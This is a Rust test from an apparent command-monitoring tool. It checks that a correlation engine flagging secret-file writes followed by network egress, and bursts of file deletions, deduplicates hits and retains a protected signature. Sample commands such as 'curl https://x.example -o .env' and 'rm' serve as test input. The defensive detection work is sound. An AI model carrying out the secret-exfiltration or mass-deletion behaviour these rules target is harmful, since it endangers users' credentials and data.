        let result = std::panic::catch_unwind(|| {
            let session_id = "w7-surfaced-retention-e3";
            let policy = crate::policy::Policy::default();
            // Capture a fixed base; every synthetic timestamp sits within the last
            // ~3s so all stay inside both the 30s secret-then-network window and the
            // 20s mass-deletion window for the whole (fast) duration of the test.
            let base = chrono::Utc::now();
            let stamp =
                |ms_before: i64| (base - chrono::Duration::milliseconds(ms_before)).to_rfc3339();

            // 1) Seed and surface the PROTECTED correlation: SecretWrite then a
            //    strictly-later Network, both in-window.
            record_typed_event(
                session_id,
                TypedEvent::new(&stamp(3000), EventKind::SecretWrite, "secret_file_write"),
            );
            record_typed_event(
                session_id,
                TypedEvent::new(&stamp(2900), EventKind::Network, "network_egress"),
            );
            let first =
                correlate_session(session_id, "curl https://x.example -o .env", &policy, &[]);
            let protected_sig = first
                .iter()
                .find(|h| h.rule_id == RuleId::SecretWriteThenNetwork)
                .expect("the seeded secret->network pair must surface once")
                .signature
                .clone();

            // 2) Surface MANY distinct mass-deletion correlations. Each call adds one
            //    more non-build delete (a NEW latest contributing delete), so each
            //    surfaces a fresh signature keyed on that latest timestamp. Drive
            //    past the OLD independent cap (100) so the protected signature would
            //    have been evicted under the old code.
            const DISTINCT_HITS: usize = 130;
            let mut distinct_seen = 0usize;
            for i in 0..DISTINCT_HITS {
                // Spacing keeps timestamps unique and recent (within ~2s of base).
                let t = stamp(2000 - i as i64 * 10);
                record_typed_event(
                    session_id,
                    TypedEvent::new(&t, EventKind::FileDelete, "file_delete")
                        .with_meta("path", &format!("src/burst{i}.rs")),
                );
                let hits = correlate_session(session_id, "rm src/burst.rs", &policy, &[]);
                if hits.iter().any(|h| h.rule_id == RuleId::MassFileDeletion) {
                    distinct_seen += 1;
                }
            }
            assert!(
                distinct_seen > 100,
                "the burst must surface well over the old 100 cap of distinct hits, got {distinct_seen}"
            );

            // 3) The protected signature must STILL be retained (its source events
            //    are still in the 200-event ring), so re-correlating the same
            //    secret->network pair surfaces NOTHING (still deduped).
            let session = load(session_id);
            assert!(
                session
                    .surfaced_correlations
                    .iter()
                    .any(|s| s == &protected_sig),
                "the protected signature must survive lockstep eviction while its \
                 source events remain in-window"
            );
            let secret_events_live = session
                .typed_events
                .iter()
                .filter(|e| e.kind == EventKind::SecretWrite)
                .count();
            assert_eq!(
                secret_events_live, 1,
                "the seeded SecretWrite must still be live in the typed-event ring"
            );
            let again =
                correlate_session(session_id, "curl https://x.example -o .env", &policy, &[]);
            assert!(
                !again
                    .iter()
                    .any(|h| h.rule_id == RuleId::SecretWriteThenNetwork),
                "the already-surfaced correlation must not re-emit while its source \
                 events are still in-window"
            );
        });

        // SAFETY: serialized by TEST_ENV_LOCK; restore regardless of outcome.
        unsafe {
            std::env::remove_var("XDG_STATE_HOME");
            std::env::remove_var("TIRITH_LOG");
        }
        if let Err(e) = result {
            std::panic::resume_unwind(e);
        }
    }
}
